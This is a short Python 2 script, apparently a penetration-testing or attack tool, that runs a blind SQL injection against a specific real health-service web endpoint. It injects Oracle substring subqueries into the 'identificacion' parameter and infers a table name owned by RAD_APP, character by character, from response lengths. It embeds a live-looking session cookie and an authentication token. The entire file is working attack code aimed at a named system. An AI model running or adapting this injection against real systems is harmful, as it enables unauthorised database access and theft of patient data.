# -*- coding: iso-8859-1 -*-
## -*- coding: utf-8 -*-
import requests
import urllib3

urllib3.disable_warnings()
requests.packages.urllib3.disable_warnings()

http_proxy  = "http://127.0.0.1:8080"
https_proxy = "http://127.0.0.1:8080"
ftp_proxy   = "http://127.0.0.1:8080"

proxyDict = {"http":http_proxy,"https":https_proxy,"ftp": ftp_proxy}



headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0','Accept':'*/*','Accept-Language':'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3','X-Requested-With':'XMLHttpRequest','Referer':'http://epsappslab.suranet.com/RegistroAtencionDomiciliariaWebWS/serviciospubs/ServicioVisualSignosVitales?claseSeguridad=suramericana.pubs.mus.RepositorioMUS&idConsumidor=idPropia&idCliente=co.com.susalud.ipsa.consumidoresServicios.SignosVitalesSaludEnCasaSV&_encriptado=OQ9FrQkHiXxJa0G1O%2F7May12ljuwjIKLOHqq%2F5H7%2FFQl4xCrmMdpxlbCCI0L4%2Fx%2F5xpnAAxP033%2FMGieimB%2F189smf903S47&tokenAutenticacion=_8dx%252BPjrnnemRKg0dHUH4fzObzshQMY8RHI0rFDPecyv14V57XWg4ghREAlVWxg8jACwGdBhNuB59NvPc2cBNGFwZwHUMtkt6Dy1gduJAzS%252FnWMSAQKO%252BXQ%253D%253D','Host':'epsappslab.suranet.com'}

cookies = dict(JSESSIONID='fBK6Xj1YfhyNpXz0QK6XGFGVF0b8RLTDyyrngQcLSK1DKJLZKW0Z!1288166745!478909444')

lista = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','_','-','!','$','.']
nombre = ''
for x in range(1,10):
	for e in lista:
	
	
		url = "http://epsappslab.suranet.com/RegistroAtencionDomiciliariaWebWS/services/reportesfacade/getConsultarHistoricoSigno?remision=118253&signo=0&identificacion=98989898' AND '"+ e +"'=(select substr(table_name,"+str(x)+",1) from all_tables where owner='RAD_APP' AND rownum < 2) AND 'a'='a&tipoIdentificacion=CC&fechaInicio=09/01/2015&fechaFin=06/17/2016&totalRegistros=20&_=1466168761626"
		
		
	# ' AND '8'=(select substr(table_name,1,1) from all_tables where owner='RAD_APP' AND rownum<2) AND 'a'='a
		r = requests.get(url, cookies=cookies, headers=headers,proxies=proxyDict,verify=False,allow_redirects=False)

		if r.headers['Content-Length'] == '1847':
			# print e + " "
			nombre = nombre + ' ' + e
			break
	x = x + 1	

print "\n El nombre de la tabla de datos es: " + nombre + "\n"








